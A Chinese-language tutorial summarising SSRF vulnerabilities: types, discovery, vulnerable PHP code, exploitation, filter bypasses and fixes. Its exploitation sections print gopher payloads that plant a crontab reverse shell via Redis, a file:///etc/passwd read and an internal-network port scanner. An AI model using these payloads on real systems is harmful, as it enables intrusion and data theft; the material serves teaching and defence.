> 原文链接: https://www.anquanke.com//post/id/226240 


# ssrf知识点总结


                                阅读量   
                                **283506**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t0182e4afa9e84e4e0a.png)](https://p1.ssl.qhimg.com/t0182e4afa9e84e4e0a.png)



作者：掌控安全-柚子

## ssrf基础知识

### <a class="reference-link" name="ssrf%E7%9A%84%E5%AE%9A%E4%B9%89"></a>ssrf的定义

SSRF(Server-Side Request Forgery,服务器请求伪造)**是一种由攻击者构造请求,由服务端发起请求的安全漏洞**,**一般情况下,SSRF攻击的目标是外网无法访问的内网系统(正因为请求时由服务端发起的,**所以服务端能请求到与自身相连而与外网隔绝的内部系统)。

#### <a class="reference-link" name="ssrf%E7%9A%84%E6%88%90%E5%9B%A0"></a>ssrf的成因

SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。

除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。



## ssrf种类

**i.显示对攻击者的响应（Basic）**

**它显示对攻击者的响应**，因此在服务器获取攻击者要求的URL后，它将把响应发送回攻击者。返回结果到客户端，如传送一个网址，会返回这个网址的界面或对应的 html 代码。

**ii.不显示响应（Blind)：**

**和上面正好相反，不会返回结果到客户端。**当您从未从初势请求中获取有关目标服务的任何信息时，就会发生这种ssrf。通常，攻击者将提供url，但是该url中的数据将永远不会返回给攻击者。要在这种情况下确认漏洞，攻击者必须使用Burp，DNSbin等类似工具。这些工具可以通过强制服务器向攻击者控制的服务器发出DNS或HTTP请求来确认服务器是易受攻击的。这种ssrf通常易于验证，但难以利用。

**iii. Semi-ssrf:**

**与Blind相似，这种ssrf不会返回相关结果请求的所有详细信息，但是会暴露一些数据**。这可能是部分数据或错误信息，他们为攻击者提供了更多信息。

有时，关于请求的元数据（例如响应时间）也可以视为Semi-ssrf，因为它们允许攻击者验证请求是否成功。

这种ssrf通常足以验证漏洞，但并不总是能够提取敏感数据。



## ssrf漏洞寻找

### <a class="reference-link" name="%E4%BB%8Eweb%E5%8A%9F%E8%83%BD%E4%B8%8A%E5%AF%BB%E6%89%BE"></a>从web功能上寻找

我们从上面的概述可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，

因此我们可以列举几种在web 应用中常见的从服务端获取其他服务器信息的的功能。

分享：通过URL地址分享网页内容

早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的&lt;tilte&gt;&lt;/title&gt;标签或者&lt;meta name=”description” content=“”/&gt;标签中content的文本内容作为显示以提供更好的用户体验。<br>
通过目标URL地址获取了title标签和相关文本内容。<br>
而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。<br>
从国内某漏洞提交平台上提交的SSRF漏洞，可以发现包括淘宝、百度、新浪等国内知名公司都曾被发现过分享功能上存在SSRF的漏洞问题。

**转码服务：**通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览<br>
由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。

**在线翻译：**通过URL地址翻译对应文本的内容。比如百度翻译，有道等。

**图片加载与下载：**通过指定URL地址加载或下载图片<br>
图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了？没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）。

**图片、文章收藏功能：**从分享的URL中读取其原文的标题等

未公开的api实现以及其他调用URL的功能<br>
此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。

### <a class="reference-link" name="%E4%BB%8EURL%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%AD%E5%AF%BB%E6%89%BE"></a>从URL关键字中寻找

在对功能上存在SSRF漏洞中URL地址特征的观察,大致有以下关键字:

[![](https://p5.ssl.qhimg.com/t01f7bf4655cae95f99.png)](https://p5.ssl.qhimg.com/t01f7bf4655cae95f99.png)

如果利用google 语法加上这些关键字去寻找SSRF漏洞，耐心的验证，现在还是可以找到存在的SSRF漏洞。



## 产生漏洞的函数

很多web应用都提供了从其他服务器获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。

**这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务器端请求伪造攻击（ssrf）。**

ssrf攻击可能存在任何语言编写的应用，接下来的文章将会介绍php中可能会存在ssrf漏洞的三种函数：file_get_contents，fsockopen()，curl_exec()。

### <a class="reference-link" name="file_get_contents()"></a>file_get_contents()

这个函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法。

比如：下面的代码执行结果则是输出test.txt文件里面的字符串。

```
&lt;?php
echo file_get_contents(“test.txt”);
?&gt;
```

下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。

```
&lt;?php
if(isset($_POST[‘url’]))
`{`
$content=file_get_contents($_POST[‘url’]);
$filename=’./images/‘.rand().’;img1.jpg’;
file_put_contents($filename,$content);
echo $_POST[‘url’];
$img=”&lt;img src=\"".$filename."\"/&gt;“;
`}`
echo $img;
?&gt;
```

代码分析：isset函数是判断有没有提交url<br>
第一行$content变量将远程URL中的内容保存到content变量中<br>
第二行随机生成一个文件路径<br>
第三行获取了远程的内容后将其写到新的文件中<br>
第四行输出url<br>
第五行将保存的文件名保存到标签中

**函数优缺点**<br>**优点**：在抓取单个文件上，效率很高，返回没有头信息的文件。<br>**缺点**：在抓取远程文件时，和fopen一样容易出错。在抓取多个跨域文件时，未对DNS进行缓存，所以效率上不不高。

### <a class="reference-link" name="fsockopen()"></a>fsockopen()

使用fsockopen函数实现获取用户制定url的数据（文件或者html）。

这个函数会使用socket跟服务器建立tcp连接，传输原始数据。

fsockopen本身就是打开一个网络连接或者Unix套接字连接。

```
&lt;?php
$host=$_GET[‘url’];
$fp = fsockopen(“$host”, 80, $errno, $errstr, 30);
if (!$fp) `{`
echo “$errstr ($errno)&lt;br /&gt;\n”;
`}` else `{`
$out = “GET / HTTP/1.1\r\n”;
$out .= “Host: $host\r\n”;
$out .= “Connection: Close\r\n\r\n”;
fwrite($fp, $out);
while (!feof($fp)) `{`
echo fgets($fp, 128);
`}`
fclose($fp);
`}`
?&gt;
```

代码运行效果如图。

[![](https://p3.ssl.qhimg.com/t01fb09d21e43d859d5.png)](https://p3.ssl.qhimg.com/t01fb09d21e43d859d5.png)

**函数优缺点**

**优点**：fsockopen 较底层，可以设置基于UDP或是TCP协议去交互。 返回完整信息。 因为其稳定性，在抓取远程图片时，使用该函数。

**缺点：**配置麻烦，不易操作。

### <a class="reference-link" name="curl_exec()"></a>curl_exec()

该函数可以执行给定的 curl 会话。

```
&lt;?php
if(isset($_POST[‘url’]))
`{`
$link = $_POST[‘url’];
$curlobj=curl_init();
curl_setopt($curlobj,CURLOPT_POST,0);
curl_setopt($curlobj,CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($curlobj,CURLOPT_URL,$link);
$result=curl_exec($curlobj);
curl_close($curlobj);
$filename=’../images/‘.rand().’.jpg’;
file_put_contents($filename,$result);
$img=”&lt;img src=\"".$filename."\"/&gt;“;
echo $img;
`}`?&gt;
```

**函数优缺点**

**优点：**经过的包装支持HTTPS认证,HTTP POST方法,HTTP PUT方法,FTP上传， kerberos认证，HTTP上传，代理服务器，cookies，用户名/密码认整下载文件断点续传，上载文件断点续传，http代理服务器管道（ proxy tunneling），甚至它还支持IPv6,socks5代理服务器,通过http代理服务器上传文件到FTP服务器等等，功能十分强大。

**缺点：**配置复杂一些。



## ssrf漏洞验证

1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>
比如:资源地址类型为 [http://www.xxx.com/a.php?image=（地址）](http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89) 的就可能存在SSRF漏洞

2.dnslog等工具进行测试，看是否被访问：可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。

3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。

—从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址

—通过二级域名暴力猜解工具模糊猜测内网地址

4.直接返回的Banner、title、content等信息

5.留意bool型SSRF<br>
一般的SSRF在应用识别阶段返回的信息相对较多,比如Banner信息,HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回. 而Bool型SSRF的却永远只有True或者False。因为没有任何Response信息,所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload。



## ssrf利用方式

一些利用方式：

对外网、服务器所在内网及本地系统进行端口扫描<br>
攻击运行在内网或本地的应用程序<br>
对内网Web应用进行指纹识别，获取企业单位内部的资产信息<br>
通过HTTPGET的请求方式来攻击内外网的Web应用<br>
利用file协议读取本地文件<br>
DoS攻击（请求大文件，始终保持连接keep-alive always）

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E5%88%A9%E7%94%A8"></a>本地利用

curl支持大量的协议，例如file, dict, gopher, http

[![](https://p3.ssl.qhimg.com/t01abc69ffa869ce962.png)](https://p3.ssl.qhimg.com/t01abc69ffa869ce962.png)

利用file协议查看文件<br>
curl -v ‘file:///etc/passwd’

[![](https://p4.ssl.qhimg.com/t017d1c5ddfa6eebf4e.png)](https://p4.ssl.qhimg.com/t017d1c5ddfa6eebf4e.png)

利用dict探测端口

```
curl -v ‘dict://127.0.0.1:22’
curl -v ‘dict://127.0.0.1:6379/info’
```

利用gopher协议反弹shell

```
curl -v ‘gopher://127.0.0.1:6379/_3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a/1 bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a1%0d%0a$4%0d%0asave%0d%0a1%0d%0a$4%0d%0aquit%0d%0a’
```

### <a class="reference-link" name="%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8"></a>远程利用

漏洞代码testssrf.php（未作任何SSRF防御）

```
function curl($url)`{`
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
`}`
$url = $_GET[‘url’];
curl($url);
```

[![](https://p3.ssl.qhimg.com/t013ef97026d46053b6.png)](https://p3.ssl.qhimg.com/t013ef97026d46053b6.png)

2.利用dict协议查看端口开放

当端口开放的时候

[![](https://p3.ssl.qhimg.com/t01d970973062b36362.png)](https://p3.ssl.qhimg.com/t01d970973062b36362.png)

当端口未开放的时候

[![](https://p5.ssl.qhimg.com/t018bb2b532e2d8fdf5.png)](https://p5.ssl.qhimg.com/t018bb2b532e2d8fdf5.png)

漏洞代码testssrf2.php<br>
限制了只能使用HTTP,HTTPS，设置跳转重定向为True（默认不跳转）

```
&lt;?php
function curl($url)`{`
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
//限制为HTTP,HTTPS
curl_setopt($ch,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($url);
curl_close();
`}`
$url = $_GET[‘url’];
curl($url);
?&gt;
```

此时用file、dict等协议就没有用,但是可以利用302跳转进行利用。

```
&lt;?php
$schema = $_GET[‘s’];
$ip = $_GET[‘i’];
$port = $_GET[‘p’];
$query = $_GET[‘q’];
if(empty($port))`{`
header(“Location: $schema://$ip/$query”);
`}`else`{`
header(“Location: $schema://$ip:$port/$query”);
`}`
?&gt;
```

### <a class="reference-link" name="%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"></a>探测内网

ssrf最常见的就是探测内网

一个通用脚本，爆破指定的一些端口和IP的D段。

```
-- coding: utf-8 --
import requests
import time
ports = [‘80’,’6379’,’3306’,’8080’,’8000’]
session = requests.Session();
for i in range(1, 255):
ip = ‘192.168.0.%d’ % i #内网ip地址
for port in ports:
url = ‘‘ %(ip,port)
try:
res = session.get(url,timeout=3)
if len(res.text) != 0 : #这里长度根据实际情况改
print(ip,port,’is open’)
except:
continue
print(‘Done’)
```

### <a class="reference-link" name="%E6%94%BB%E5%87%BBRedis%E6%9C%8D%E5%8A%A1"></a>攻击Redis服务

**Redis一般都是绑定在6379端口**.如果没有设置口令（默认是无),攻击者就可以通过SSRF漏洞未授权访问内网Redis,一般用来写入Crontab定时任务用来反弹shell，或者写入webshell等等。

### <a class="reference-link" name="%E6%94%BB%E5%87%BBMysql%E6%9C%8D%E5%8A%A1"></a>攻击Mysql服务

如果内网开启了3306端口，存在没有密码的mysql,则也可以使用gopher协议进行ssrf攻击。<br>
([https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) “还是工具gopherus”)



## ssrf过滤绕过

### <a class="reference-link" name="%E6%9B%B4%E6%94%B9IP%E5%9C%B0%E5%9D%80%E5%86%99%E6%B3%95"></a>更改IP地址写法

一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：

```
^10(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))`{`3`}`$
^172.([1][6-9]|[2]\d|3[01])(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))`{`2`}`$
^192.168(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))`{`2`}`$
```

对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：

8进制格式：0300.0250.0.1<br>
16进制格式：0xC0.0xA8.0.1<br>
10进制整数格式：3232235521<br>
16进制整数格式：0xC0A80001<br>
合并后两位：1.1.278 / 1.1.755<br>
合并后三位：1.278 / 1.755 / 3.14159267

另外IP中的每一位，各个进制可以混用。

访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。

另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90%E5%88%B0%E5%86%85%E7%BD%91%E7%9A%84%E5%9F%9F%E5%90%8D"></a>使用解析到内网的域名

如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。<br>
另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，

例如192.168.0.1.xip.io，解析到192.168.0.1。

如果php后端只是用parse_url函数中的host参数判断是否等于127.0.0.1，那么可以用以下特殊网址绕过：xip.io，nip.io，sslip.io。

比如：`[http://127.0.0.1.xip.io/1.php](http://127.0.0.1.xip.io/1.php) ,实际上访问的是[http://127.0.0.1/1.php](http://127.0.0.1/1.php)

可以使用xip.io或者是xip.name 进行302跳转

[![](https://p1.ssl.qhimg.com/t01fea680b5211e487b.png)](https://p1.ssl.qhimg.com/t01fea680b5211e487b.png)

[![](https://p2.ssl.qhimg.com/t0118ff516a67b60284.png)](https://p2.ssl.qhimg.com/t0118ff516a67b60284.png)

[![](https://p5.ssl.qhimg.com/t010cf7d4dec7f54b35.png)](https://p5.ssl.qhimg.com/t010cf7d4dec7f54b35.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90url%20%E6%89%80%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"></a>利用解析url 所出现的问题

在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。

比如 [[http://www.baidu.com](http://www.baidu.com) [@127](https://github.com/127).0.0.1/]当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com ，

认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com ，

而实际上这个URL所请求的内容都是127.0.0.1上的内容。这是利用@绕过，此绕过同样在URL跳转绕过中适用。

[![](https://p3.ssl.qhimg.com/t016f2b2ae7ecb3b3c8.png)](https://p3.ssl.qhimg.com/t016f2b2ae7ecb3b3c8.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%B7%B3%E8%BD%AC"></a>利用跳转

如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。

可以使用如 [http://httpbin.org/redirect-to?url=http://192.168.0.1](http://httpbin.org/redirect-to?url=http://192.168.0.1) 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。

常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。<br>
比如将[http://192.168.0.1](http://192.168.0.1) 转换成短地址

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f9b8baf06182d459.png)

[![](https://p0.ssl.qhimg.com/t01b1ebbfe67630b34b.png)](https://p0.ssl.qhimg.com/t01b1ebbfe67630b34b.png)

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E5%90%84%E7%A7%8D%E9%9D%9EHTTP%E5%8D%8F%E8%AE%AE"></a>通过各种非HTTP协议

如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。

比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。

例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：

```
gopher://127.0.0.1:6379/_1%0d%0a$8%0d%0aflushall%0d%0a3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a/1 bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件。

使用file协议可以避免服务端程序对于所访问的IP进行的过滤。

例如我们可以通过 file:///d:/1.txt 来访问D盘中1.txt的内容。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8DNS%E8%A7%A3%E6%9E%90"></a>利用DNS解析

如果目标对域名或者IP进行了限制，那么可以使用dns服务器将自己的域名解析到内网ip

### <a class="reference-link" name="%E5%88%A9%E7%94%A8IPv6"></a>利用IPv6

有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1 或IPv6的内网域名来绕过过滤。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8IDN"></a>利用IDN

一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。<br>
在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。

### <a class="reference-link" name="%E6%B7%BB%E5%8A%A0%E7%AB%AF%E5%8F%A3%E5%8F%B7"></a>添加端口号

有些网站限制了子网段,可以加 :80 端口绕过。[http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80](http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80)

### <a class="reference-link" name="%E4%BC%AA%E5%8D%8F%E8%AE%AE"></a>伪协议

php ssrf中的伪协议：

`file;dict;sftp;ldap;tftp;gopher;http`

Java ssrf 中的伪协议：

`file;ftp;mailto;http;https;jar;netdoc;gopher`



## ssrf危害

扫内网

向内部任意主机的任意端口发送精心构造的Payload

DOS攻击（请求大文件，始终保持连接Keep-Alive Always）

对内网web应用进行指纹识别，通过访问默认文件实现

攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sql注入等）

利用file协议读取本地文件等



## ssrf漏洞修复

1.禁止跳转。

2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

3.限制请求的端口只能为Web端口，不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题。

4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）,以防止对内网进行攻击。

5.限制请求的端口为http常用的端口，比如 80、443、8080、8090。

6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

7.对DNS Rebinding，考虑使用DNS缓存或者Host白名单。

**官方公众号：掌控安全EDU**
